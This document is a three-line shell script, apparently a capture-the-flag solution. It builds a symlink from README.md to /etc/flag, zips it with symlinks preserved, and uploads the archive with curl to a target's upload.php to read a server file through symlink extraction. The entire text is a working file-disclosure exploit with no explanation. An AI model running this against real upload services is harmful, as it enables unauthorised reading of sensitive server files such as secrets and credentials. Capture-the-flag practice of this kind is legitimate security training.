ln -s /etc/flag README.md
zip --symlinks test.zip README.md
curl -F fileToUpload=@test.zip http://$1/upload.php
